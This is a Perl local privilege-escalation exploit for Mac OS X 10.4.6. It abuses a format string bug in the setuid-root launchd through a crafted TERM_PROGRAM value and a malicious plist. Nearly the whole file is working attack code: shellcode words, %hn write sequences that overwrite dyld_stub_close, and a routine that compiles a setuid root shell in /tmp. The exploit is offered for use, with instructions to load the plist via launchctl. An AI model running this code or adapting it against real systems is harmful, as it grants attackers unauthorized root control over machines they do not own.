# http://www.digitalmunition.com/FailureToLaunch.pl 
# Code by Kevin Finisterre kf_lists[at]digitalmunition[dot]com
#
# This is a practical application of Non Executable Stack Lovin - http://www.digitalmunition.com/NonExecutableLovin.txt
#
# This code currently jumps into 0x1811111 via dyld_stub_close()
#
# This exploit will create a malicious .plist file for you to use with launchctl
# k-fs-computer:~ kf$ launchctl load ./com.pwnage.plist
#
# In theory I guess you could also drop this in ~/Library/LaunchAgents 
#
# This was tested against OSX 10.4.6 8l1119 on a 1.5GHz Intel Core Solo
# 
# k-fs-computer:~ kf$ ls -al /sbin/launchd
# -rwsr-sr-x   1 root  wheel  161944 Feb 19 04:46 /sbin/launchd
# k-fs-computer:~ kf$ file /sbin/launchd
# /sbin/launchd: setuid setgid Mach-O universal binary with 2 architectures
# /sbin/launchd (for architecture i386):  Mach-O executable i386
# /sbin/launchd (for architecture ppc):   Mach-O executable ppc
#
# ./src/SystemStarter.c:374:              syslog(level, buf);
# proactive security eh? 

foreach $key (keys %ENV) {

    delete $ENV{$key};

}

$writeaddr = 0xa0011163;  # close()
#$writeaddr = 0xa00119f1;  # cxa_finalize() (must wait 25 seconds or so if you use this one)

$sc = (0x1811111);  

# both of these arrays are put in size order due to the multiple writes via unformatted syslog() call

# seteuid after thought... whoops...I had to move some shit arround to account for this
@seteuid =
([$sc+2,  $sc+4,  $sc,    $sc+6],
 [0x5050, 0xb7b0, 0xc031, 0x80cd], );

# Write the following instructions to 0xa0011163 <dyld_stub_close> as well as nemos execve() to 0x1811111
# mov    $0x1811111,%eax
# jmp    *%eax
# 
@payload =
([$writeaddr+6, $writeaddr, $sc+12, $sc+16, $sc+28, $sc+22, $sc+26, $sc+24, $sc+10, $sc+14, $sc+18, $sc+30, $writeaddr+2, $sc+20, $sc+8, $writeaddr+4],    # 0
 [0x00e0, 0x11b8, 0x2f2f, 0x2f68, 0x3bb0, 0x50e3, 0x5353, 0x5454, 0x6850, 0x6873, 0x6d74, 0x80cd, 0x8111, 0x8970, 0xc031, 0xff01], ); 

$ENV{"TERM_PROGRAM"} = "." . 
# string of write address 
pack('l', $payload[0][0]) . pack('l', $payload[0][1]) . pack('l', $payload[0][2]) . pack('l', $payload[0][3]) . pack('l', $payload[0][4]) . pack('l', $payload[0][5]) . pack('l', $payload[0][6]) . pack('l', $payload[0][7]) . pack('l', $payload[0][8]) . pack('l', $payload[0][9]) . pack('l', $payload[0][10]) . pack('l', $payload[0][11]) . pack('l', $payload[0][12]) . pack('l', $payload[0][13]) . pack('l', $payload[0][14]) . pack('l', $payload[0][15]) . pack('l', $seteuid[0][0]) . pack('l', $seteuid[0][1]) . pack('l', $seteuid[0][2]) . pack('l', $seteuid[0][3]) ; 

# lazy non looped length calculations
$pay1  = $payload[1][0];
$pay2  = ($payload[1][1] - $pay1 - 0x1 ); 
$pay3  = ($payload[1][2] - $pay1 - $pay2 - 0x1); 
$pay4  = ($payload[1][3] - $pay1 - $pay2 - $pay3 - 0x1); 
$pay5  = ($payload[1][4] - $pay1 - $pay2 - $pay3 - $pay4 - 0x1); 
$pay6  = ($payload[1][5] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - 0x1); 
$pay7  = ($payload[1][6] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - 0x1); 
$pay8  = ($payload[1][7] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - 0x1); 
$pay9  = ($payload[1][8] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - 0x1); 
$pay10 = ($payload[1][9] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - $pay9 - 0x1); 
$pay11 = ($payload[1][10] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - $pay9 - $pay10 - 0x1); 
$pay12 = ($payload[1][11] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - $pay9 - $pay10 - $pay11 - 0x1); 
$pay13 = ($payload[1][12] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - $pay9 - $pay10 - $pay11 - $pay12 - 0x2); 
$pay14 = ($payload[1][13] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - $pay9 - $pay10 - $pay11 - $pay12 - $pay13 - 0x2); 
$pay15 = ($payload[1][14] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - $pay9 - $pay10 - $pay11 - $pay12 - $pay13 - $pay14 - 0x2); 
$pay16 = ($payload[1][15] - $pay1 - $pay2 - $pay3 - $pay4 - $pay5 - $pay6 - $pay7 - $pay8 - $pay9 - $pay10 - $pay11 - $pay12 - $pay13 - $pay14 - $pay15 - 0x3); 
# seems I forgot the seteuid(0) 
$pay17 =  0xff + $seteuid[1][0];  
$pay18 = 0xff + ($seteuid[1][1] - $pay17); 
$pay19 = 0xff + ($seteuid[1][2] - $pay17 - $pay18  )  ; 
$pay20 = 0xff + ($seteuid[1][3] - $pay17 - $pay18 - $pay19 - 0x7ec8 - 0x270) ;   # Something is fucking this write up... subtracting 0x8138 seems to help 

# The offset is off by 6 if you are trying to debug this in gdb
$format = 
"%." . $pay1 . "d" . "%246\$hn" .
"%." . $pay2 . "d" . "%247\$hn" .
"%." . $pay3 . "d" . "%248\$hn" .
"%." . $pay4 . "d" . "%249\$hn" .
"%." . $pay5 . "d" . "%250\$hn" .
"%." . $pay6 . "d" . "%251\$hn" .
"%." . $pay7 . "d" . "%252\$hn" .
"%." . $pay8 . "d" . "%253\$hn" .
"%." . $pay9 . "d" . "%254\$hn" .
"%." . $pay10 . "d" . "%255\$hn" .
"%." . $pay11 . "d" . "%256\$hn" .
"%." . $pay12 . "d" . "%257\$hn" . 
"%." . $pay13 . "d" . "%258\$hn" .
"%." . $pay14 . "d" . "%259\$hn" .
"%." . $pay15 . "d" . "%260\$hn" .
"%." . $pay16 . "d" . "%261\$hn" .
"%." . $pay17 . "d" . "%262\$hn" .
"%." . $pay18 . "d" . "%263\$hn" .
"%." . $pay19 . "d" . "%264\$hn" .
"%." . $pay20 . "d" . "%265\$hn" ;

open(SUSH,">/tmp/aaa.c");
printf SUSH "int main(){setuid(0);setgid(0);system(\"/bin/sh\");}\n";
system("PATH=$PATH:/usr/bin/ cc -o /tmp/sh /tmp/aaa.c");

open(PWNED,">com.pwnage.plist");   

print PWNED "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
	<key>Label</key>
	<string>" . "$format" .
	"</string>
	<key>ProgramArguments</key>
	<array>
		<string>http://www.digitalmunition.com</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>\n";

print "open a new window and type - \"launchctl load ./com.pwnage.plist\"\n";
system("/sbin/launchd");


